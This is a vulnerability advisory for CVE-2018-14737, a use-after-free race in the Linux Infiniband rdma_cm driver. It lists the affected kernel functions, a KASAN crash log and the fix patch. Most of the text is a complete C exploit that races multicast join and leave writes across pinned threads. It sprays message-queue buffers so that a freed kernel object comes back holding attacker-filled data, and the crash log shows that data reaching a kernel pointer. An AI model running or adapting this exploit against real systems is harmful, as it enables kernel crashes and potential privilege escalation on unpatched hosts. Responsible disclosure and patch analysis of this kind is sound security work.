**Vulnerability Summary**<br>
A bug in the threads synchronization of Infiniband Driver can cause an Use After Free. A struct that is allocated and free’d by a thread, is accessible through a second thread. If the second thread is calling the function “idr_find” before the struct was free’d by the first thread, then he can still use the struct after it was free’d.

**Vendor Response**<br>
“Infiniband: fix a possible use-after-free bug has been added to the 4.17-stable tree. Patches currently in stable-queue are queue-4.17/infiniband-fix-a-possible-use-after-free-bug.patch”

**CVE**<br>
CVE-2018-14737

**Credit**<br>
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
Linux systems that contains the Infiniband Driver running Kernel version older than 4.17 (The version that the patch was issued into).

**Vulnerability Details**<br>
The function ucma_process_join() free’s the new allocated “mc” struct, if there is any error after that.
```c
static ssize_t ucma_process_join(struct ucma_file *file,
				 struct rdma_ucm_join_mcast *cmd,  int out_len)
{
	struct rdma_ucm_create_id_resp resp;
	struct ucma_context *ctx;
	struct ucma_multicast *mc;
	struct sockaddr *addr;
	int ret;
	u8 join_state;
	if (out_len < sizeof(resp))
		return -ENOSPC;
	addr = (struct sockaddr *) &cmd->addr;
	if (cmd->addr_size != rdma_addr_size(addr))
		return -EINVAL;
	if (cmd->join_flags == RDMA_MC_JOIN_FLAG_FULLMEMBER)
		join_state = BIT(FULLMEMBER_JOIN);
	else if (cmd->join_flags == RDMA_MC_JOIN_FLAG_SENDONLY_FULLMEMBER)
		join_state = BIT(SENDONLY_FULLMEMBER_JOIN);
	else
		return -EINVAL;
	ctx = ucma_get_ctx_dev(file, cmd->id);
	if (IS_ERR(ctx))
		return PTR_ERR(ctx);
	mutex_lock(&file->mut);
	mc = ucma_alloc_multicast(ctx);
	if (!mc) {
		ret = -ENOMEM;
		goto err1;
	}
	mc->join_state = join_state;
	mc->uid = cmd->uid;
	memcpy(&mc->addr, addr, cmd->addr_size);
	ret = rdma_join_multicast(ctx->cm_id, (struct sockaddr *)&mc->addr,
				  join_state, mc);
	if (ret)
		goto err2;
	resp.id = mc->id;
	if (copy_to_user(u64_to_user_ptr(cmd->response),
			 &resp, sizeof(resp))) {
		ret = -EFAULT;
		goto err3;
	}
	mutex_lock(&mut);
	idr_replace(&multicast_idr, mc, mc->id);
	mutex_unlock(&mut);
	mutex_unlock(&file->mut);
	ucma_put_ctx(ctx);
	return 0;
err3:
	rdma_leave_multicast(ctx->cm_id, (struct sockaddr *) &mc->addr);
	ucma_cleanup_mc_events(mc);
err2:
	mutex_lock(&mut);
	idr_remove(&multicast_idr, mc->id);
	mutex_unlock(&mut);
	list_del(&mc->list);
	kfree(mc);
err1:
	mutex_unlock(&file->mut);
	ucma_put_ctx(ctx);
	return ret;
}
```
However, in the same time, ucma_leave_multicast() function that is called by a second thread could find this “mc” through idr_find() before ucma_process_join() frees it, since it is already allocated.
So “mc” is used in ucma_leave_multicast() after it is been allocated and freed in ucma_process_join().

```c
static ssize_t ucma_leave_multicast(struct ucma_file *file,
				    const char __user *inbuf,
				    int in_len, int out_len)
{
	struct rdma_ucm_destroy_id cmd;
	struct rdma_ucm_destroy_id_resp resp;
	struct ucma_multicast *mc;
	int ret = 0;
	if (out_len < sizeof(resp))
		return -ENOSPC;
	if (copy_from_user(&cmd, inbuf, sizeof(cmd)))
		return -EFAULT;
	mutex_lock(&mut);
	mc = idr_find(&multicast_idr, cmd.id);
	if (!mc)
		mc = ERR_PTR(-ENOENT);
	else if (mc->ctx->file != file)
		mc = ERR_PTR(-EINVAL);
	else if (!atomic_inc_not_zero(&mc->ctx->ref))
		mc = ERR_PTR(-ENXIO);
	else
		idr_remove(&multicast_idr, mc->id);
	mutex_unlock(&mut);
	if (IS_ERR(mc)) {
		ret = PTR_ERR(mc);
		goto out;
	}
	rdma_leave_multicast(mc->ctx->cm_id, (struct sockaddr *) &mc->addr);
	mutex_lock(&mc->ctx->file->mut);
	ucma_cleanup_mc_events(mc);
	list_del(&mc->list);
	mutex_unlock(&mc->ctx->file->mut);
	ucma_put_ctx(mc->ctx);
	resp.events_reported = mc->events_reported;
	kfree(mc);
	if (copy_to_user(u64_to_user_ptr(cmd.response),
			 &resp, sizeof(resp)))
		ret = -EFAULT;
out:
	return ret;
}
```

**Exploit**<br>
```c
#define _GNU_SOURCE
#include <endian.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/time.h>
#include <sched.h>
#define SEND 1
#define RECV 0
#define RDMATHREADS 30
static void test();
void createThreads();
void testTreadWake();
void exitRdmaThreads();
void loop()
{
    createThreads();
    while (1) {
        test();
    }
}
struct thread_t {
    int created, running, call, CPUNumber, exitFlag;
    pthread_t th;
};
struct msgInfo {
    int msgid;
    int CPUNumber;
    int sendOrRecv; //true: send ; false: recv
};
struct {
    long mtype;
    char mtext[0xAC];
//char mtext[0xB0];
} msg = {0x42, {0}};
static struct thread_t *threads;
static void execute_call(int call);
static int running;
static int collide;
int threadWaittingNum = 0;
int sendCount = 0;
int *sendNum = 0;
int *threadWaitting;
int *threadRunning;
int *ipcThreadStop;
void setAffinity(void* arg);
static void* thr(void* arg)
{
    struct thread_t* th = (struct thread_t*)arg;
    struct msgInfo setRdmaCPUInfo;
    setRdmaCPUInfo.CPUNumber = th->CPUNumber;
    setAffinity(&setRdmaCPUInfo);
    for (;;) {
        while (!__atomic_load_n(&th->running, __ATOMIC_ACQUIRE))
        {
            syscall(SYS_futex, &th->running, FUTEX_WAIT, 0, 0);
        }
        if(__atomic_load_n(&th->exitFlag, __ATOMIC_ACQUIRE))
        {
            syscall(SYS_futex, &th->running, FUTEX_WAKE);
            pthread_detach(pthread_self());
            return 0;
        }
        execute_call(th->call);
        __atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
        __atomic_store_n(&th->running, 0, __ATOMIC_RELEASE);
        syscall(SYS_futex, &th->running, FUTEX_WAKE);
    }
    return 0;
}
int threadNum = 0;
void createThreads()
{
    int policy = 0;
    int max_prio_for_policy = 0;
    threads = mmap(NULL, sizeof(struct thread_t)*RDMATHREADS, PROT_READ |
                   PROT_WRITE,
                   MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    for (int thread = 0; thread < RDMATHREADS; thread++) {
        struct thread_t* th = &threads[thread];
        if (!th->created) {
            th->created = 1;
            th->exitFlag = 0;
            th->CPUNumber = (thread==0 ? 0 : 1);
            pthread_attr_t attr;
            pthread_attr_init(&attr);
            pthread_attr_setstacksize(&attr, 128 << 10);
            if(thread == 0)
            {
                pthread_create(&th->th, &attr, thr, th);
                perror("Warning_1111: ");
            }
            else
                pthread_create(&th->th, &attr, thr, th);
            pthread_attr_getschedpolicy(&attr, &policy);
            max_prio_for_policy = sched_get_priority_min(policy);
            pthread_setschedprio(th->th, max_prio_for_policy);
            pthread_attr_destroy(&attr);
        }
    }
}
void readTime(int call)
{
    struct timeval tv;
    printf("run at %d\n",call);
    gettimeofday(&tv,NULL);
    printf("sendNum is ==== %d at %d \n", __atomic_load_n(sendNum,
            __ATOMIC_ACQUIRE), call);
    printf("millisecond:%ld\n",tv.tv_sec*1000000  + tv.tv_usec);
    return;
}
uint64_t r[3] = {0xffffffffffffffff, 0xffffffff, 0xffffffff};
uint64_t procid;
void execute_call(int call)
{
    //printf("call is %d\n",call);
    long res;
    switch (call) {
    case 0:
        *(uint32_t*)0x20000080 = 0;
        //printf("create.........\n");
        *(uint16_t*)0x20000084 = 0x18;
        *(uint16_t*)0x20000086 = 0xfa00;
        *(uint64_t*)0x20000088 = 2;
        *(uint64_t*)0x20000090 = 0x20000040;
        *(uint16_t*)0x20000098 = 0x111;
        *(uint8_t*)0x2000009a = 0xd;
        *(uint8_t*)0x2000009b = 0;
        *(uint8_t*)0x2000009c = 0;
        *(uint8_t*)0x2000009d = 0;
        *(uint8_t*)0x2000009e = 0;
        *(uint8_t*)0x2000009f = 0;
        res = syscall(__NR_write, r[0], 0x20000080, 0x20); // create
        if (res != -1)
            r[1] = *(uint32_t*)0x20000040;
        break;
    case 1:
        printf("join.........\n");
        *(uint32_t*)0x20000180 = 0x16;
        *(uint16_t*)0x20000184 = 0x98;
        *(uint16_t*)0x20000186 = 0xfa00;
        *(uint64_t*)0x20000188 = 0x20000140;
        *(uint64_t*)0x20000190 = 3;
        *(uint32_t*)0x20000198 = r[1];
        *(uint16_t*)0x2000019c = 0x10;
        *(uint16_t*)0x2000019e = 1;
        *(uint16_t*)0x200001a0 = 2;
        *(uint16_t*)0x200001a2 = htobe16(0x4e23);
        *(uint8_t*)0x200001a4 = 0xac;
        *(uint8_t*)0x200001a5 = 0x14;
        *(uint8_t*)0x200001a6 = 0x14;
        *(uint8_t*)0x200001a7 = 0xbb;
        *(uint8_t*)0x200001a8 = 0;
        *(uint8_t*)0x200001a9 = 0;
        *(uint8_t*)0x200001aa = 0;
        *(uint8_t*)0x200001ab = 0;
        *(uint8_t*)0x200001ac = 0;
        *(uint8_t*)0x200001ad = 0;
        *(uint8_t*)0x200001ae = 0;
        *(uint8_t*)0x200001af = 0;
        __atomic_store_n(sendNum, 0, __ATOMIC_RELEASE);
//readTime(1);
        res = syscall(__NR_write, r[0], 0x20000180, 0xa0); //
        ucma_join_multicast alloc "mc", and then the function will free it and
        "ctx", if there are some error.
//readTime(11111);
        if (res != -1)
                r[2] = *(uint32_t*)0x20000140;
        break;
    case 2:
        //printf("leave.........\n");
        *(uint32_t*)0x20000240 = 0x11;
        *(uint16_t*)0x20000244 = 0x10;
        *(uint16_t*)0x20000246 = 0xfa00;
        *(uint64_t*)0x20000248 = 0x20000100;
        *(uint32_t*)0x20000250 = 0; // set id
        *(uint32_t*)0x20000254 = 0;
        __atomic_store_n(sendNum, 0, __ATOMIC_RELEASE);
//readTime(2);
        syscall(__NR_write, r[0], 0x20000240, 0x18); //
        ucma_leave_multicast() find "mc", and use it and "ctx". Crash in it.
        break;
    }
}
void runJoin()
{
    __atomic_store_n(threadRunning, 1, __ATOMIC_RELEASE);
    syscall(SYS_futex, threadWaitting, FUTEX_WAKE, threadWaittingNum,
            NULL, NULL, 0);
    struct thread_t* th = &threads[0];
    if (th->created) {
        __atomic_store_n(&th->call, 1, __ATOMIC_RELEASE);
        __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
        __atomic_store_n(&th->running, 1, __ATOMIC_RELEASE);
        syscall(SYS_futex, &th->running, FUTEX_WAKE);
    }
}
int count = 0;
void runCreateOrLeave(int call, int threadNum)
{
    struct thread_t* th = &threads[threadNum]; // 0 or 1
    struct timespec ts;
    if (th->created) {
        __atomic_store_n(&th->call, call,  __ATOMIC_RELEASE);
        __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
        __atomic_store_n(&th->running, 1, __ATOMIC_RELEASE);
        syscall(SYS_futex, &th->running, FUTEX_WAKE);
    }
    ts.tv_sec = 0;
    ts.tv_nsec = 20 * 1000 * 1000;
    syscall(SYS_futex, &th->running, FUTEX_WAIT, 1, &ts);
}
void runCreateOrLeaveNoWait(int call, int threadNum)
{
    struct thread_t* th = &threads[threadNum];
    if (th->created) {
        __atomic_store_n(&th->call, call,  __ATOMIC_RELEASE);
        __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
        __atomic_store_n(&th->running, 1, __ATOMIC_RELEASE);
        syscall(SYS_futex, &th->running, FUTEX_WAKE);
    }
}
void exitRdmaThreads()
{
    struct timespec ts;
    struct thread_t* th;
    th = &threads[0];
    ts.tv_sec = 0;
    ts.tv_nsec = 20 * 1000 * 1000;
    syscall(SYS_futex, &th->running, FUTEX_WAIT, 1, &ts);
    for(int i = 0; i < RDMATHREADS; i++)
    {
        th = &threads[i];
        if (th->created) {
            th->created = 0;
            __atomic_store_n(&th->exitFlag, 1, __ATOMIC_RELEASE);
            __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
            __atomic_store_n(&th->running, 1, __ATOMIC_RELEASE);
            syscall(SYS_futex, &th->running, FUTEX_WAKE);
            struct timespec ts;
            ts.tv_sec = 0;
            ts.tv_nsec = 20 * 1000 * 1000;
            syscall(SYS_futex, &th->running, FUTEX_WAIT, 1, &ts);
        }
    }
    munmap(threads, sizeof(struct thread_t)*RDMATHREADS);
    if(sendCount)
        syscall(SYS_futex, ipcThreadStop, FUTEX_WAIT, 1, NULL, NULL, 0);
}
void setAffinity(void *arg)
{
    int i;
    cpu_set_t mask;
    cpu_set_t get;
    int cpuId = ((struct msgInfo*)arg)->CPUNumber;
    CPU_ZERO(&mask);
    CPU_SET(cpuId, &mask);
    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0) {
        fprintf(stderr, "set thread affinity failed\n");
    }
    CPU_ZERO(&get);
    if (pthread_getaffinity_np(pthread_self(), sizeof(get), &get) < 0) {
        fprintf(stderr, "get thread affinity failed\n");
    }
}
void *holeThread(struct msgInfo *msgInfo)
{
    int msgid = msgInfo->msgid;
    setAffinity(&msgInfo);
    if(msgInfo->sendOrRecv == SEND)
    {
        while(1)
        {
            __atomic_fetch_add(&threadWaittingNum, 1, __ATOMIC_RELAXED);
            syscall(SYS_futex, threadWaitting, FUTEX_WAIT, 1, NULL, NULL, 0);
            while(__atomic_load_n(threadRunning, __ATOMIC_ACQUIRE))
            {
                if (msgsnd(msgid, &msg, sizeof(msg.mtext), 0) == -1) {
                    perror("msgsnd");
                    exit(1);
                }
                __atomic_fetch_add(&sendCount, 1, __ATOMIC_RELAXED);
                __atomic_fetch_add(sendNum, 1, __ATOMIC_RELAXED);
            }
            __atomic_fetch_sub(&threadWaittingNum, 1, __ATOMIC_RELAXED);
        }
    }
    else
    {
        while(1)
        {
            __atomic_fetch_add(&threadWaittingNum, 1, __ATOMIC_RELAXED);
            syscall(SYS_futex, threadWaitting, FUTEX_WAIT, 1, NULL, NULL, 0);
            int tSendCount = 0;
            while(__atomic_load_n(&sendCount, __ATOMIC_ACQUIRE))
            {
                if(__atomic_load_n(&sendCount, __ATOMIC_ACQUIRE)<5)
                {
                    usleep(1000*1000);
                    continue;
                }
                if (msgrcv(msgid, &msg, sizeof(msg.mtext), 0x42, 0) == -1) {
                    perror("msgrcv error !!!!");
                    exit(1);
                }
                __atomic_fetch_sub(&sendCount, 1, __ATOMIC_RELAXED);
                __atomic_fetch_add(&tSendCount, 1, __ATOMIC_RELAXED);
            }
            syscall(SYS_futex, ipcThreadStop, FUTEX_WAKE);
            __atomic_fetch_sub(&threadWaittingNum, 1, __ATOMIC_RELAXED);
        }
    }
}
void createHoleThreads(struct msgInfo *msgInfo)
{
    pthread_t tid;
    pthread_attr_t thAttr;
    int policy = 0;
    int max_prio_for_policy = 0;
    if (pthread_create(&tid, NULL, (void *)holeThread, msgInfo) != 0) {
        perror("create thread");
        fprintf(stderr, "thread create failed\n");
        return;
    }
    pthread_attr_init(&thAttr);
    pthread_attr_getschedpolicy(&thAttr, &policy);
    max_prio_for_policy = sched_get_priority_max(policy);
    pthread_setschedprio(tid, max_prio_for_policy);
    pthread_attr_destroy(&thAttr);
    return;
}
void test()
{
    printf("===== run test %d ====\n",count++);
    long res = -1;
    memcpy((void*)0x20000680, "/dev/infiniband/rdma_cm", 24);
    res = syscall(__NR_openat, 0xffffffffffffff9c, 0x20000680, 2, 0);
    if (res != -1)
        r[0] = res;
    collide = 1;
    runCreateOrLeave(0, 1); // run rdma create on CPU 0 and Thread 1
    runJoin(); // run rdma Join on CPU 0 and Thread 0
    for(int i = 3; i < RDMATHREADS; i++)
        runCreateOrLeaveNoWait(2, i); // run rdma leave on CPU 1 and Thread
    [3:RDMATHREADS-1]
    runCreateOrLeave(2, 2); // run rdma leave on CPU 1 and Thread 2
    __atomic_store_n(threadRunning, 0, __ATOMIC_RELEASE);
    if(res != -1)
        close(res);
}
void testTreadWake()
{
    syscall(SYS_futex, threadWaitting, FUTEX_WAKE, 200, NULL, NULL, 0);
    perror("threadWaitting_1: ");
}
int main()
{
    syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
    memset(msg.mtext, '\x41', sizeof(msg.mtext));
    int pid = 0;
    int msgid = 0;
    struct msgInfo sendHoleInfo;
    struct msgInfo recvHoleInfo;
    struct msgInfo sendHoleInfo_1;
    struct msgInfo recvHoleInfo_1;
    threadWaitting = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
                          MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    *threadWaitting = 1;
    threadRunning = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
                         MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    *threadRunning = 0;
    ipcThreadStop = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
                         MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    *ipcThreadStop = 1;
    sendNum = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
                   MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    *sendNum = 0;
    if ((msgid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }
    sendHoleInfo.msgid = msgid;
    sendHoleInfo.sendOrRecv = SEND;
    sendHoleInfo.CPUNumber = 0;
    recvHoleInfo.msgid = msgid;
    recvHoleInfo.sendOrRecv = RECV;
    recvHoleInfo.CPUNumber = 1;
    printf("Creating ipc msg threads\n");
    for(int i = 0; i < 250; i++) {
        createHoleThreads(&sendHoleInfo);
    }
    for(int i = 0; i < 150; i++) {
        createHoleThreads(&recvHoleInfo);
    }
    printf("Ipc msg threads are created\n");
    for (procid = 0; procid < 1; procid++) {
        if (fork() == 0) {
            //for (;;) {
            loop();
            //}
        }
    }
    printf("ending..................\n");
    sleep(1000000);
    return 0;
}
```

**Crash Info**<br>
```log
[  623.954258] kasan: CONFIG_KASAN_INLINE enabled
[  623.956513] kasan: GPF could be caused by NULL-ptr deref or user
memory access
[  623.959668] general protection fault: 0000 [#8] SMP KASAN PTI
[  623.962402] Modules linked in: kvm_intel joydev ppdev kvm irqbypass
psmouse e1000 parport_pc floppy parport pata_acpi i2c_piix4
qemu_fw_cfg autofs4 input_leds serio_raw mac_hid
[  623.968486] CPU: 1 PID: 4272 Comm: use_poc_3 Tainted: G    B D W
   4.14.33 #1
[  623.971948] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS 1.10.2-1ubuntu1 04/01/2014
[  623.975340] task: ffff880085868040 task.stack: ffff880066e60000
[  623.977698] RIP: 0010:__mutex_lock+0x2a9/0x1c00
[  623.979900] RSP: 0018:ffff880066e67680 EFLAGS: 00010206
[  623.981902] RAX: dffffc0000000000 RBX: 4141414141414141 RCX: 0000000000000000
[  623.984623] RDX: 0828282828282828 RSI: 0000000000000000 RDI: 0000000000000246
[  623.987391] RBP: ffff880066e67a70 R08: ffffffff8313f0b2 R09: ffff880085868040
[  623.990093] R10: ffff880066e67548 R11: 0000000000000000 R12: ffff880066e677a0
[  623.993642] R13: ffff880066e67800 R14: 0000000000000000 R15: ffff880066e67880
[  623.996525] FS:  00007f1fdc554700(0000) GS:ffff880097d00000(0000)
knlGS:0000000000000000
[  623.998753] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  624.000779] CR2: 00007f1fe0622a08 CR3: 000000007fe40000 CR4: 00000000000006e0
[  624.002582] Call Trace:
[  624.003570]  ? debug_check_no_locks_freed+0x2c0/0x2c0
[  624.004730]  ? ucma_leave_multicast+0x472/0x9a0
[  624.006545]  ? mutex_lock_io_nested+0x1ad0/0x1ad0
[  624.008518]  ? debug_check_no_locks_freed+0x2c0/0x2c0
[  624.010548]  ? ucma_leave_multicast+0x3cd/0x9a0
[  624.011826]  ? lock_acquire+0x5b0/0x5b0
[  624.012676]  ? radix_tree_tagged+0x60/0x60
[  624.013884]  ? lock_acquire+0x20d/0x5b0
[  624.015467]  ? rdma_leave_multicast+0x541/0x820
[  624.017408]  ? lock_acquire+0x5b0/0x5b0
[  624.018971]  ? lock_downgrade+0x820/0x820
[  624.020497]  ? __mutex_unlock_slowpath+0x170/0xcb0
[  624.021855]  ? radix_tree_tag_clear+0x350/0x350
[  624.023283]  ? do_raw_spin_trylock+0x1a0/0x1a0
[  624.024889]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[  624.026230]  ? retint_kernel+0x10/0x10
[  624.027714]  mutex_lock_nested+0x1b/0x20
[  624.029088]  ? mutex_lock_nested+0x1b/0x20
[  624.030617]  ucma_leave_multicast+0x472/0x9a0
[  624.031874]  ? ucma_query_path.isra.11+0xa60/0xa60
[  624.033216]  ? lock_downgrade+0x820/0x820
[  624.034471]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7
[  624.035921]  ? kasan_check_write+0x14/0x20
[  624.037151]  ucma_write+0x31f/0x430
[  624.038174]  ? ucma_query_path.isra.11+0xa60/0xa60
[  624.039702]  ? ucma_destroy_id+0x5b0/0x5b0
[  624.041199]  ? __check_object_size+0x2d8/0x560
[  624.043076]  ? ucma_destroy_id+0x5b0/0x5b0
[  624.044756]  __vfs_write+0x90/0x120
[  624.046565]  vfs_write+0x1a0/0x520
[  624.048185]  SyS_write+0xff/0x240
[  624.049546]  ? SyS_read+0x240/0x240
[  624.050923]  ? lock_downgrade+0x820/0x820
[  624.052617]  ? SyS_read+0x240/0x240
[  624.054182]  do_syscall_64+0x28f/0x7f0
[  624.055722]  ? syscall_return_slowpath+0x400/0x400
[  624.057637]  ? syscall_return_slowpath+0x253/0x400
[  624.059575]  ? prepare_exit_to_usermode+0x2b0/0x2b0
[  624.061498]  ? preempt_notifier_dec+0x20/0x20
[  624.063201]  ? perf_trace_sys_enter+0xc70/0xc70
[  624.064978]  ? trace_hardirqs_off_thunk+0x1a/0x1c
[  624.066805]  entry_SYSCALL_64_after_hwframe+0x42/0xb7
```

**Patch**<br>
```c
--- a/drivers/infiniband/core/ucma.c
+++ b/drivers/infiniband/core/ucma.c
@@ -235,7 +235,7 @@ static struct ucma_multicast* ucma_alloc
                return NULL;
        mutex_lock(&mut);
-       mc->id = idr_alloc(&multicast_idr, mc, 0, 0, GFP_KERNEL);
+       mc->id = idr_alloc(&multicast_idr, NULL, 0, 0, GFP_KERNEL);
        mutex_unlock(&mut);
        if (mc->id < 0)
                goto error;
@@ -1421,6 +1421,10 @@ static ssize_t ucma_process_join(struct
                goto err3;
        }
+       mutex_lock(&mut);
+       idr_replace(&multicast_idr, mc, mc->id);
+       mutex_unlock(&mut);
+
        mutex_unlock(&file->mut);
        ucma_put_ctx(ctx);
        return 0;
```
